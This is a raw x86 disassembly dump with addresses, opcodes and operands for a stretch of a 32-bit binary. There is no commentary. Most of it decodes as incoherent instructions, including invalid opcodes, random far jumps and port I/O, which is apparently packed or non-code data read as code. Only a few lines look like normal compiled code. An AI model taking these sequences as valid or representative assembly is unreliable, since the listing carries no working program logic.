  40288e:	sub    al,0x23
  402890:	sbb    al,BYTE PTR [ebx+ebx*1]
  402893:	mov    WORD PTR [ebp+0x74c7dc86],ss
  402899:	mov    cs,WORD PTR [ebp+0x60c4aab5]
  40289f:	pop    ss
  4028a0:	xor    esp,DWORD PTR [eax+eax*2]
  4028a3:	inc    ecx
  4028a4:	pop    eax
  4028a5:	inc    ecx
  4028a6:	int3   
  4028a7:	add    cl,ch
  4028a9:	mov    ecx,0xcf7d8d49
  4028ae:	sti    
  4028af:	xor    edi,edx
  4028b1:	add    al,0x8c
  4028b3:	pop    ss
  4028b4:	daa    
  4028b5:	mov    esi,0x641ce330
  4028ba:	dec    ebp
  4028bb:	nop
  4028bc:	mov    ah,0xfc
  4028be:	icebp  
  4028bf:	xor    eax,0x4e5580b7
  4028c4:	scas   eax,DWORD PTR es:[edi]
  4028c5:	jns    0x4028ad
  4028c7:	or     dl,ah
  4028c9:	pop    ss
  4028ca:	loopne 0x4028bd
  4028cc:	out    dx,eax
  4028cd:	int3   
  4028ce:	mov    ecx,0xca43800f
  4028d3:	out    dx,al
  4028d4:	mov    ebx,0x233cd76e
  4028d9:	das    
  4028da:	lods   al,BYTE PTR ds:[esi]
  4028db:	ins    BYTE PTR es:[edi],dx
  4028dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028dd:	inc    edx
  4028de:	and    eax,0xbc344d08
  4028e3:	cmp    eax,0x34800cf2
  4028e8:	mov    ah,0x4
  4028ea:	std    
  4028eb:	jbe    0x40288c
  4028ed:	sub    DWORD PTR [eax+0x3bb109ad],ebx
  4028f3:	jns    0x4028fa
  4028f5:	jecxz  0x402891
  4028f7:	jnp    0x4028d7
  4028f9:	mov    ds:0x18a916a6,eax
  4028fe:	icebp  
  4028ff:	push   eax
  402900:	clc    
  402901:	jmp    0xd02f10f0
  402906:	fsub   DWORD PTR [eax-0x67]
  402909:	push   es
  40290a:	or     eax,0xe5622162
  40290f:	(bad)  
  402910:	sbb    bl,bh
  402912:	call   0x5a7a:0x8f1f4eb1
  402919:	sub    ch,BYTE PTR ds:0x482fda5b
  40291f:	out    0x73,eax
  402921:	call   0x5840:0xbe23dfc3
  402928:	arpl   WORD PTR [ecx-0x6a888566],di
  40292e:	test   BYTE PTR [edx-0x681126da],dh
  402934:	fnsave [ecx+0x39445f12]
  40293a:	(bad)  
  40293b:	or     al,0xb8
  40293d:	inc    eax
  40293e:	mov    edi,0x3d66b0f6
  402943:	adc    ah,bh
  402945:	mov    al,0x0
  402947:	pop    edx
  402948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402949:	mov    ebx,0x7841ccb2
  40294e:	mov    dh,0xe4
  402950:	pop    ss
  402951:	mov    cl,0xbf
  402953:	jae    0x4028e9
  402955:	push   ss
  402956:	lds    esp,FWORD PTR [ebx+edi*4+0x1]
  40295a:	outs   dx,BYTE PTR ds:[esi]
  40295b:	clc    
  40295c:	xchg   esi,eax
  40295d:	jl     0x4029ba
  40295f:	xchg   ecx,eax
  402960:	(bad)  
  402961:	outs   dx,BYTE PTR ds:[esi]
  402962:	jns    0x4029af
  402964:	jmp    0x8abcebfa
  402969:	icebp  
  40296a:	push   ecx
  40296b:	cwde   
  40296c:	sti    
  40296d:	push   ds
  40296e:	adc    edi,ebp
  402970:	rol    eax,cl
  402972:	les    ebx,FWORD PTR [edx-0x17]
  402975:	mov    BYTE PTR ds:0x89570f34,0x8b
  40297c:	int    0x11
  40297e:	push   ebp
  40297f:	xor    ebx,DWORD PTR [ebp+0x4cfe8719]
  402985:	xor    DWORD PTR [esi-0x5c79093e],esi
  40298b:	mov    ds:0x9a0b32db,al
  402990:	inc    edi
  402991:	inc    esi
  402992:	test   eax,0x3eaa2bfd
  402997:	xchg   DWORD PTR [ebx+0x5d],esp
  40299a:	mov    ebp,0xaeeb7f32
  40299f:	ins    DWORD PTR es:[edi],dx
  4029a0:	(bad)  
  4029a1:	nop
  4029a2:	dec    esp
  4029a3:	mov    edi,0xd4ae6f0e
  4029a8:	mov    DWORD PTR [eax],esi
  4029aa:	sbb    ebp,DWORD PTR [ecx]
  4029ac:	mov    BYTE PTR [edx],dl
  4029ae:	retf   
  4029af:	xchg   ecx,eax
  4029b0:	push   eax
  4029b1:	mov    al,0x37
  4029b3:	pushf  
  4029b4:	pop    edx
  4029b5:	ds fs cmp al,0x15
  4029b9:	jb     0x4029d1
  4029bb:	sub    esp,edx
  4029bd:	out    0x3d,al
  4029bf:	data16 sbb BYTE PTR [ecx-0x2a0e770e],dh
  4029c6:	lahf   
  4029c7:	inc    ebp
  4029c8:	mov    esp,0x3d538782
  4029cd:	jecxz  0x4029ab
  4029cf:	rol    DWORD PTR [ebp+0x4c],0xdd
  4029d3:	pop    ebp
  4029d4:	aam    0x30
  4029d6:	inc    edx
  4029d7:	cmp    cl,BYTE PTR [edi-0x6056ca90]
  4029dd:	call   0x9293:0x203e8cc6
  4029e4:	sub    edx,DWORD PTR [ebp+0x11688b34]
  4029ea:	retf   0xb836
  4029ed:	sub    esp,DWORD PTR [ebx-0x7a]
  4029f0:	(bad)  
  4029f1:	cmp    bl,BYTE PTR [edx+0x6328c1ce]
  4029f7:	mov    eax,ds:0x4fbdc8c3
  4029fc:	jecxz  0x4029ef
  4029fe:	fsub   QWORD PTR ds:0x8a6a5701
  402a04:	leave  
  402a05:	xor    BYTE PTR [ebx],bl
  402a07:	mov    esi,0xfe9626cf
  402a0c:	in     al,dx
  402a0d:	data16 stos BYTE PTR es:[edi],al
  402a0f:	jle    0x4029f5
  402a11:	xchg   esi,eax
  402a12:	jo     0x4029a5
  402a14:	push   0x3
  402a16:	jb     0x402a52
  402a18:	mov    bl,0x26
  402a1a:	mov    bl,0x27
  402a1c:	cmp    eax,0xcdab104c
  402a21:	sub    BYTE PTR [ebx+eax*2],0x41
  402a25:	mov    al,0x50
  402a27:	sbb    DWORD PTR [ecx],0xffffff9b
  402a2a:	dec    esi
  402a2b:	pop    edi
  402a2c:	rol    BYTE PTR [esi],0x40
  402a2f:	sar    BYTE PTR [esi-0x46dae496],cl
  402a35:	mov    ebx,0xb5b4edfa
  402a3a:	mov    gs,WORD PTR [edx-0x21]
  402a3d:	test   BYTE PTR [ebp-0x63a3d83a],dl
  402a43:	repnz push bp
  402a46:	pop    es
  402a47:	mov    edi,0x1ea8e564
  402a4c:	outs   dx,BYTE PTR ds:[esi]
  402a4d:	fld    st(7)
  402a4f:	sbb    al,0x78
  402a51:	inc    eax
  402a52:	iret   
  402a53:	sar    BYTE PTR [edi-0x76],1
  402a56:	push   ebp
  402a57:	add    BYTE PTR [eax-0x6dadf2c3],al
  402a5d:	sbb    BYTE PTR [ecx],bl
  402a5f:	and    BYTE PTR [ebx],0x59
  402a62:	jns    0x402a74
  402a64:	jae    0x402acd
  402a66:	jnp    0x4029fc
  402a68:	mov    DWORD PTR [esi-0x7a],0xf04e01df
  402a6f:	ins    DWORD PTR es:[edi],dx
  402a70:	ret    0x8d10
  402a73:	sub    BYTE PTR [ecx-0x6b2d8004],ah
  402a79:	lock ret 0xc1f5
  402a7d:	mov    dh,0xc2
  402a7f:	sub    DWORD PTR [edi-0x235971ff],eax
  402a85:	xchg   esp,eax
  402a86:	scas   eax,DWORD PTR es:[edi]
  402a87:	into   
  402a88:	retf   
  402a89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a8a:	popa   
  402a8b:	loopne 0x402ad1
  402a8d:	push   ds
  402a8e:	push   edx
  402a8f:	jne    0x402b03
  402a91:	jne    0x402a88
  402a93:	sbb    bh,bh
  402a95:	cmp    ch,BYTE PTR [eax]
  402a97:	adc    dl,al
  402a99:	nop
  402a9a:	imul   esi
  402a9c:	mov    ebp,0xc6aea0a0
  402aa2:	std    
  402aa3:	push   ebx
  402aa4:	stc    
  402aa5:	inc    edi
  402aa6:	or     dh,BYTE PTR [edx]
  402aa8:	cmp    ecx,ecx
  402aaa:	stos   DWORD PTR es:[edi],eax
  402aab:	dec    eax
  402aac:	cmc    
  402aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aae:	test   BYTE PTR [edx+esi*1],ch
  402ab1:	or     esi,esi
  402ab3:	add    eax,0x7c078f25
  402ab8:	leave  
  402ab9:	push   ds
  402aba:	mov    edx,0x897cdfa4
  402abf:	add    ebx,DWORD PTR [ecx+0xf]
  402ac2:	cmc    
  402ac3:	mov    al,0x39
  402ac5:	sbb    bh,bl
  402ac7:	(bad)  
  402ac8:	adc    DWORD PTR [ecx+0x30],edx
  402acb:	(bad)  
  402acc:	ds jbe 0x402b04
  402acf:	add    eax,0x9d81f5ee
  402ad4:	dec    edi
  402ad5:	mov    edi,DWORD PTR [eax+0x1e]
  402ad8:	xor    esi,DWORD PTR [edi+edx*1-0x3a]
  402adc:	jmp    0x99fcec52
  402ae1:	pusha  
  402ae2:	jl     0x402b11
  402ae4:	inc    esi
  402ae5:	mov    edx,0x17b76038
  402aea:	jge    0x402a85
  402aec:	push   ds
  402aed:	(bad)  
  402aef:	std    
  402af0:	ja     0x402af4
  402af2:	xor    BYTE PTR [ecx+0x142e601b],cl
  402af8:	push   esi
  402af9:	add    DWORD PTR [esi-0x59d32df1],edi
  402aff:	(bad)  
  402b00:	(bad)
  402b03:	jmp    0x7dce:0xc5b1fe85
  402b0a:	test   eax,0xcc4528e3
  402b0f:	sub    ecx,eax
  402b11:	jmp    0x402db0
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	ds cdq 
  402b24:	cdq    
  402b25:	and    eax,0x7878128e
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402ab3
  402b2f:	stc    
  402b30:	mov    ah,0x71
  402b32:	dec    ecx
  402b33:	fsub   DWORD PTR [ecx]
  402b36:	cmc    
  402b37:	sbb    ebx,esi
  402b39:	in     al,0x38
  402b3b:	mov    bh,0x3b
  402b3d:	add    ecx,ebx
  402b3f:	push   edx
  402b40:	sub    dl,BYTE PTR ss:[edx-0xc]
  402b44:	(bad)  
  402b45:	arpl   bx,sp
  402b47:	add    dl,BYTE PTR [eax+edi*1]
  402b4a:	fimul  DWORD PTR [ebx-0x68]
  402b4d:	out    0x1c,eax
  402b4f:	ins    DWORD PTR es:[edi],dx
  402b50:	scas   al,BYTE PTR es:[edi]
  402b51:	xor    ch,BYTE PTR [edi-0x3cdf7610]
  402b57:	inc    esi
  402b58:	ret    0xb7e5
  402b5b:	add    edx,DWORD PTR [ebx+ebp*8]
  402b5e:	test   eax,0x419097ee
  402b63:	xchg   esi,eax
  402b64:	and    BYTE PTR [eax+0x42070f37],bh
  402b6a:	pop    ebp
  402b6b:	or     BYTE PTR [edi+0x6ca17b5b],bl
  402b71:	lar    ebx,WORD PTR [eax+0x79c27a03]
  402b78:	imul   edx,DWORD PTR ds:0x9b05bbb7,0x774dd665
  402b82:	pop    eax
  402b83:	in     al,dx
  402b84:	pop    esp
  402b85:	std    
  402b86:	jnp    0x402ba4
  402b88:	and    eax,0x6295067d
  402b8d:	sbb    al,0x80
  402b8f:	or     cl,bh
  402b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b92:	sbb    cl,BYTE PTR [edx]
  402b94:	js     0x402b8c
  402b96:	cmp    edi,DWORD PTR [edi]
  402b98:	popa   
  402b99:	dec    ecx
  402b9a:	fimul  DWORD PTR ss:[ebp-0x2e77938e]
  402ba1:	mov    cl,BYTE PTR [edi-0x22f8bb2a]
  402ba7:	push   esp
  402ba8:	dec    ebx
  402ba9:	mov    bh,0x24
  402bab:	push   ecx
  402bac:	push   esi
  402bad:	retf   
  402bae:	adc    ah,BYTE PTR [edi]
  402bb0:	je     0x402c07
  402bb2:	stos   DWORD PTR es:[edi],eax
  402bb3:	mov    ebp,0x655807cc
  402bb8:	pop    ecx
  402bb9:	pop    edx
  402bba:	bound  ebp,QWORD PTR [edi]
  402bbc:	bound  esi,QWORD PTR [ebp-0x397dc451]
  402bc2:	xchg   edx,eax
  402bc3:	dec    ecx
  402bc4:	mov    edi,0xb6cd43fa
  402bc9:	adc    al,0xfb
  402bcb:	shr    DWORD PTR [ebx],1
  402bcd:	gs (bad) 
  402bcf:	(bad)  [ecx+0x6e0771a9]
  402bd5:	mov    ah,0xa2
  402bd7:	fbld   TBYTE PTR [edx-0x48]
  402bda:	xchg   edi,eax
  402bdb:	int    0x7b
  402bdd:	ret    0x40e0
  402be0:	retf   
  402be1:	jle    0x402ba6
  402be3:	stos   DWORD PTR es:[edi],eax
  402be4:	and    eax,0xdf789c84
  402be9:	ds jl  0x402c1a
  402bec:	and    ah,bl
  402bee:	iret   
  402bef:	dec    esi
  402bf0:	lahf   
  402bf1:	xchg   esi,eax
  402bf2:	xchg   DWORD PTR [esi],esi
  402bf4:	mov    ds,WORD PTR [edx*1-0x74de1486]
  402bfb:	jmp    0xe3799e2c
  402c00:	mov    ds:0xf70161fe,eax
  402c05:	sbb    dh,BYTE PTR [edi]
  402c07:	xchg   ebp,eax
  402c08:	mov    edi,0xbd4b3138
  402c0d:	arpl   WORD PTR [edx+0x39],bx
  402c10:	or     dh,BYTE PTR [eax]
  402c12:	in     eax,0x3d
  402c14:	int3   
  402c15:	(bad)  
  402c16:	cmp    eax,0x3e1585eb
  402c1b:	enter  0x7774,0x27
  402c1f:	jno    0x402c7b
  402c21:	imul   edx,DWORD PTR [ebx-0x32bb658a],0xffffffcd
  402c28:	inc    esp
  402c29:	cmp    BYTE PTR [edx+0x36c1410b],ah
  402c2f:	test   DWORD PTR [edx-0x5b],ecx
  402c32:	std    
  402c33:	mov    ds:0x74f9287,eax
  402c38:	and    al,0x4f
  402c3a:	test   ah,0xf4
  402c3d:	adc    cl,BYTE PTR [ebp-0x3]
  402c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c41:	inc    ebp
  402c42:	test   DWORD PTR [edx+edi*4],edx
  402c45:	(bad)  
  402c46:	jb     0x402bf6
  402c48:	xor    eax,0xe35396d8
  402c4d:	and    edx,DWORD PTR [ebx]
  402c4f:	in     al,dx
  402c50:	retf   
  402c51:	inc    eax
  402c52:	ret    
  402c53:	jl     0x402c4b
  402c55:	es xor dh,0x98
  402c59:	mov    dh,0x85
  402c5b:	shl    DWORD PTR [edi+0x2390cf60],cl
  402c61:	sbb    al,0x19
  402c63:	dec    eax
  402c64:	cmp    esp,DWORD PTR [ecx+0x75702253]
  402c6a:	loop   0x402c1f
  402c6c:	arpl   sp,cx
  402c6e:	loop   0x402c5c
  402c70:	mov    esi,0x991fa3a1
  402c75:	in     eax,0x85
  402c77:	lods   eax,DWORD PTR ds:[esi]
  402c78:	in     al,0xe4
  402c7a:	in     al,0x4b
  402c7c:	repnz lods al,BYTE PTR ds:[esi]
  402c7f:	cmp    al,0x92
  402c81:	in     al,dx
  402c82:	retf   0x5992
  402c85:	jp     0x402ca2
  402c87:	lods   al,BYTE PTR ds:[esi]
  402c88:	adc    eax,0xa96e17f5
  402c8d:	push   0x18ae3a0f
  402c92:	xchg   ecx,eax
  402c93:	aad    0x64
  402c95:	and    ecx,DWORD PTR [ecx+0x1fd50621]
  402c9b:	sbb    edx,edx
  402c9d:	fwait
  402c9e:	pop    esp
  402c9f:	jae    0x402c37
  402ca1:	xor    DWORD PTR [esi-0x50],ebx
  402ca4:	iret   
  402ca5:	loop   0x402c3e
  402ca7:	gs cmp eax,ebp
  402caa:	dec    ebp
  402cab:	stos   BYTE PTR es:[edi],al
  402cac:	adc    BYTE PTR [edx+0x36990cef],dl
  402cb2:	aam    0x4c
  402cb4:	lock mov edi,0x85168cfb
  402cba:	daa    
  402cbb:	rcr    bh,0xe4
  402cbe:	push   0x2f0f577
  402cc3:	stos   DWORD PTR es:[edi],eax
  402cc4:	shl    DWORD PTR [eax],cl
  402cc6:	ins    DWORD PTR es:[edi],dx
  402cc7:	fsubr  st,st(6)
  402cc9:	test   ebx,0x9b57feb8
  402ccf:	add    DWORD PTR [eax+0x299a4e07],ebp
  402cd5:	por    mm2,QWORD PTR es:[esi+esi*1+0x37580ede]
  402cde:	clc    
  402cdf:	test   eax,0xd13dd196
  402ce4:	mov    cl,0xe2
  402ce6:	push   esi
  402ce7:	aam    0xcc
  402ce9:	pop    ss
  402cea:	mov    WORD PTR [esi+0x1b],ss
  402ced:	(bad)  
  402cee:	cmp    DWORD PTR [eax],ecx
  402cf0:	(bad)  
  402cf1:	leave  
  402cf2:	dec    ebp
  402cf3:	rcl    DWORD PTR [edx+0x34],0x2
  402cf7:	pop    esi
  402cf8:	stos   DWORD PTR es:[edi],eax
  402cf9:	push   0x8c9384e5
  402cfe:	(bad)  
  402cff:	adc    al,0x0
  402d01:	daa    
  402d02:	adc    eax,0xad7183cf
  402d07:	pop    ebx
  402d08:	xchg   ecx,eax
  402d09:	lds    edx,FWORD PTR [edi*8+0x17caf3f8]
  402d10:	mov    al,0xe
  402d12:	mov    ecx,0xc0189eec
  402d17:	adc    eax,0x52
  402d1a:	add    ecx,ebx
  402d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d1d:	pusha  
  402d1e:	std    
  402d1f:	mov    ebp,0xcedfab69
  402d24:	in     al,0x9d
  402d26:	loope  0x402d9c
  402d28:	test   DWORD PTR [esi-0x3947cf14],esi
  402d2e:	out    0x80,al
  402d30:	pop    ds
  402d31:	mov    ecx,DWORD PTR ds:0x8ec6de4c
  402d37:	fidiv  DWORD PTR ds:0x3eb4a1b3
  402d3d:	ret    0x4fc9
  402d40:	adc    al,0xb5
  402d42:	fisttp WORD PTR [esi+esi*4]
  402d45:	scas   eax,DWORD PTR es:[edi]
  402d46:	out    dx,eax
  402d47:	mov    gs,WORD PTR [ebx+0x26]
  402d4a:	fldenv [esi-0x34d8b39c]
  402d50:	out    dx,al
  402d51:	rol    DWORD PTR [ecx+0x7db83039],cl
  402d57:	js     0x402cf3
  402d59:	and    ah,bh
  402d5b:	mov    edi,0x3c119db7
  402d60:	lods   eax,DWORD PTR ds:[esi]
  402d61:	and    eax,0x31f45341
  402d66:	ret    0xe7a4
  402d69:	dec    edx
  402d6a:	call   0x1851a536
  402d6f:	lods   al,BYTE PTR ds:[esi]
  402d70:	jge    0x402d5a
  402d72:	dec    esi
  402d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d74:	add    bh,BYTE PTR [ebx-0xff72a57]
  402d7a:	xchg   esi,eax
  402d7b:	hlt    
  402d7c:	push   edx
  402d7d:	push   cs
  402d7e:	jecxz  0x402ddd
  402d80:	retf   0xda79
  402d83:	ss or  DWORD PTR ss:[edx+0x15],edi
  402d88:	pop    esi
  402d89:	aam    0xbd
  402d8b:	es fwait
  402d8d:	inc    esi
  402d8e:	fmul   DWORD PTR [edi]
  402d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d91:	or     al,0xf5
  402d93:	dec    esp
  402d94:	push   ds
  402d95:	jno    0x402e03
  402d97:	add    ecx,DWORD PTR [ebx+0x1d]
  402d9a:	dec    DWORD PTR [edi-0x4f06f62d]
  402da0:	rol    BYTE PTR [edx],cl
  402da2:	(bad)  
  402da4:	ficom  DWORD PTR [edi+0x223387f9]
  402daa:	dec    ebx
  402dab:	cmp    BYTE PTR [ebx],bl
  402dad:	aas    
  402dae:	jmp    0x670f5990
  402db3:	mov    DWORD PTR [ebp-0x4],ecx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	push   eax
  402df3:	(bad)  
  402df4:	retf   0xc8f
  402df7:	pop    ss
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e20
  402dff:	cmc    
  402e00:	(bad)  
  402e01:	loope  0x402e54
  402e03:	push   edi
  402e04:	pusha  
  402e05:	cld    
  402e06:	mov    ?,WORD PTR [esi+esi*2]
  402e09:	scas   eax,DWORD PTR es:[edi]
  402e0a:	fadd   st(0),st
  402e0c:	call   0x4372:0xca219179
  402e13:	js     0x402e8b
  402e15:	push   edi
  402e16:	call   0x9a1d123b
  402e1b:	mov    esi,0x1ddccbe2
  402e20:	test   BYTE PTR [esi+0x24],al
  402e23:	out    0xce,al
  402e25:	dec    edx
  402e26:	aad    0xb4
  402e28:	scas   eax,DWORD PTR es:[edi]
  402e29:	xchg   ecx,esp
  402e2b:	retf   0xc3aa
  402e2e:	sbb    dh,BYTE PTR [ecx+0x4a]
  402e31:	out    0xbb,al
  402e33:	mov    al,0x5a
  402e35:	add    al,0x49
  402e37:	and    ecx,DWORD PTR [eax]
  402e39:	inc    edx
  402e3a:	scas   al,BYTE PTR es:[edi]
  402e3b:	sti    
  402e3c:	inc    edi
  402e3d:	repz and eax,0x326bf89
  402e43:	dec    ebp
  402e44:	mov    esi,0xc31b18d6
  402e49:	call   0x7d01566
  402e4e:	retf   
  402e4f:	jb     0x402e95
  402e51:	iret   
  402e52:	retf   
  402e53:	mov    ebp,0xb854432
  402e58:	call   FWORD PTR [edx+esi*8-0x38]
  402e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e5d:	imul   eax,DWORD PTR [esp+eiz*2+0x7193882c],0xffffff8c
  402e65:	or     esp,DWORD PTR [edx+0x47298f53]
  402e6b:	or     eax,0x64a72ae8
  402e70:	mov    bl,0xfe
  402e72:	sub    BYTE PTR [edi+0x3c90fa18],al
  402e78:	push   ecx
  402e79:	cwde   
  402e7a:	leave  
  402e7b:	pop    ebp
  402e7c:	inc    edi
  402e7d:	mov    esi,DWORD PTR [ecx+0x2b]
  402e80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e81:	cmp    ecx,DWORD PTR [eax-0x4f2c0252]
  402e87:	dec    edx
  402e88:	cmp    dl,BYTE PTR [eax]
  402e8a:	outs   dx,DWORD PTR ds:[esi]
  402e8b:	pusha  
  402e8c:	xchg   ebp,eax
  402e8d:	dec    edx
  402e8e:	fwait
  402e8f:	jg     0x402efe
  402e91:	cdq    
  402e92:	and    al,0x56
  402e94:	shl    BYTE PTR [eax-0x36ec2a4f],0x30
  402e9b:	xchg   ecx,eax
  402e9c:	dec    esi
  402e9d:	aas    
  402e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e9f:	mov    ch,0xbd
  402ea1:	dec    ebp
  402ea2:	lds    eax,FWORD PTR [ebp+eax*8+0x75369ff2]
  402ea9:	fbstp  TBYTE PTR [edi+0x7115751b]
  402eaf:	or     BYTE PTR [edi],bl
  402eb1:	xor    al,BYTE PTR [edi-0x120c44af]
  402eb7:	mov    eax,DWORD PTR [edx+0x614ebb07]
  402ebd:	and    cl,BYTE PTR [ebx-0x2a5862c6]
  402ec3:	pop    ecx
  402ec4:	mov    eax,0x8a2d2cd5
  402ec9:	retf   
  402eca:	test   eax,0x432c6564
  402ecf:	mov    ebp,DWORD PTR [edi+0x5c]
  402ed2:	xchg   ebx,eax
  402ed3:	stos   DWORD PTR es:[edi],eax
  402ed4:	ficomp DWORD PTR [edi]
  402ed6:	scas   eax,DWORD PTR es:[edi]
  402ed7:	pop    edx
  402ed8:	cmp    DWORD PTR [esi+ebp*8+0x6b02be37],edx
  402edf:	or     ch,BYTE PTR [eax+0x3a]
  402ee2:	ret    0x8292
  402ee5:	inc    eax
  402ee6:	push   edx
  402ee7:	jmp    0xc288:0x5585e07c
  402eee:	adc    edi,edx
  402ef0:	xchg   ecx,eax
  402ef1:	out    dx,al
  402ef2:	jne    0x402f40
  402ef4:	out    0x67,al
  402ef6:	xchg   esi,eax
  402ef7:	pop    esi
  402ef8:	imul   esp,edx,0xffffffb2
  402efb:	push   eax
  402efc:	inc    esp
  402efd:	(bad)  
  402efe:	mov    ebp,0x51804f6
  402f03:	push   ecx
  402f04:	sahf   
  402f05:	fdivr  DWORD PTR [ebx+0x76429a52]
  402f0b:	ja     0x402ea8
  402f0d:	(bad)  [ebx-0xc4b3304]
  402f13:	dec    ecx
  402f14:	in     al,0xe0
  402f16:	ret    0xcc98
  402f19:	sub    BYTE PTR [ebp+ebx*2-0xd],ch
  402f1d:	jle    0x402ecd
  402f1f:	dec    esi
  402f20:	ds mov bh,0x6d
  402f23:	ret    
  402f24:	jp     0x402ebe
  402f26:	rol    BYTE PTR [ecx],1
  402f28:	fisttp DWORD PTR [edx]
  402f2a:	cmp    al,0x37
  402f2c:	and    DWORD PTR [eax+0x0],ebp
  402f2f:	(bad)  [edx]
  402f31:	and    eax,0x6e86b948
  402f36:	and    eax,0xae05eb75
  402f3b:	aaa    
  402f3c:	and    al,0xd4
  402f3e:	jg     0x402ed5
  402f40:	sub    DWORD PTR [esi],edi
  402f42:	and    edx,DWORD PTR [eax+0x657de7c7]
  402f48:	pop    edi
  402f49:	push   edi
  402f4a:	adc    edx,DWORD PTR ds:0xf263b536
  402f50:	clc    
  402f51:	jmp    0x143dd72
  402f56:	mov    dh,0x63
  402f58:	pop    eax
  402f59:	cwde   
  402f5a:	out    dx,eax
  402f5b:	enter  0x6b83,0xa4
  402f5f:	inc    esp
  402f60:	int3   
  402f61:	test   DWORD PTR [ebx+0xffc1399],0x1ff16a9d
  402f6b:	push   ecx
  402f6c:	pushf  
  402f6d:	test   BYTE PTR [edi],0x8f
  402f70:	adc    ch,dh
  402f72:	loope  0x402fb8
  402f74:	sub    esi,DWORD PTR [ebp-0x2aba3b54]
  402f7a:	adc    edx,DWORD PTR [ecx+0x22]
  402f7d:	jmp    0x402fc4
  402f7f:	mov    BYTE PTR [esp+edi*1],bh
  402f82:	das    
  402f83:	dec    esp
  402f84:	pop    eax
  402f85:	sbb    eax,0x31b8387e
  402f8a:	nop
  402f8b:	sbb    bl,ah
  402f8d:	cmp    edx,edi
  402f8f:	xchg   ebp,eax
  402f90:	push   0xffffffdc
  402f92:	pop    ebx
  402f93:	aaa    
  402f94:	fldcw  WORD PTR [ecx+ebx*8-0x6a5557f5]
  402f9b:	cmc    
  402f9c:	pusha  
  402f9d:	stos   BYTE PTR es:[edi],al
  402f9e:	sub    esp,DWORD PTR [eax-0x7d0c3cef]
  402fa4:	add    bl,0xce
  402fa7:	inc    ecx
  402fa8:	dec    edx
  402fa9:	ds mov dh,0xa7
  402fac:	rcr    DWORD PTR [esi],0x91
  402faf:	out    dx,al
  402fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fb1:	out    0x27,eax
  402fb3:	stos   BYTE PTR es:[edi],al
  402fb4:	mov    al,ds:0xca321601
  402fb9:	jnp    0x402ff7
  402fbb:	jecxz  0x403027
  402fbd:	sbb    dh,0x7f
  402fc0:	cmp    BYTE PTR [ebx],bh
  402fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fc3:	jmp    DWORD PTR [eax+eax*2-0xa]
  402fc7:	jnp    0x402fb5
  402fc9:	push   0x25
  402fcb:	add    eax,edi
  402fcd:	lea    esp,[ebx]
  402fcf:	xor    bl,bl
  402fd1:	dec    esp
  402fd2:	stc    
  402fd3:	or     al,bh
  402fd5:	out    0x30,eax
  402fd7:	push   eax
  402fd8:	outs   dx,DWORD PTR ds:[esi]
  402fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fda:	sbb    DWORD PTR ds:0x925ac794,esi
  402fe0:	(bad)  [ecx+0xc]
  402fe3:	cmp    bl,dl
  402fe5:	hlt    
  402fe6:	xchg   esp,eax
  402fe7:	add    BYTE PTR [edi],dl
  402fe9:	rcr    BYTE PTR [esi-0x17],0x0
  402fed:	sbb    cl,bl
  402fef:	mov    al,0x3f
  402ff1:	in     eax,0xa7
  402ff3:	fs inc eax
  402ff5:	jmp    0xcca9:0x80ff3d7
  402ffc:	add    ebx,0xffffffce
  402fff:	mov    edi,0xd724f957
  403004:	cdq    
  403005:	inc    ah
  403007:	mov    ah,0x8e
  403009:	pop    ecx
  40300a:	pop    es
  40300b:	retf   0xe93f
  40300e:	js     0x402fcc
  403010:	push   esi
  403011:	jp     0x40308d
  403013:	dec    al
  403015:	call   0xfcd0:0x416db504
  40301c:	shr    BYTE PTR [esp+edx*8],cl
  40301f:	mov    dh,0x78
  403021:	push   esp
  403022:	sbb    al,0x26
  403024:	imul   ecx,ecx,0xffffffa6
  403027:	scas   al,BYTE PTR es:[edi]
  403028:	mov    ch,0xa2
  40302a:	fidiv  WORD PTR [edx+edi*2+0x7b]
  40302e:	inc    edx
  40302f:	push   esp
  403030:	mov    ds:0x9e70f164,al
  403035:	addr16 or eax,0x6ecb8a14
  40303b:	inc    ebp
  40303c:	setg   BYTE PTR [ecx-0x4638df28]
  403043:	fstp   DWORD PTR [eax]
  403045:	push   0x34eb524c
  40304a:	xor    edx,DWORD PTR [ebp-0x7f]
  40304d:	mov    al,ds:0xd80fbaac
  403052:	adc    DWORD PTR [edx],ebx
  403054:	stos   DWORD PTR es:[edi],eax
  403055:	pop    edi
  403056:	push   ecx
  403057:	sar    ebx,1
  403059:	push   ecx
  40305a:	(bad)  
  40305c:	mov    ebp,0x464907bc
  403061:	xchg   ebp,eax
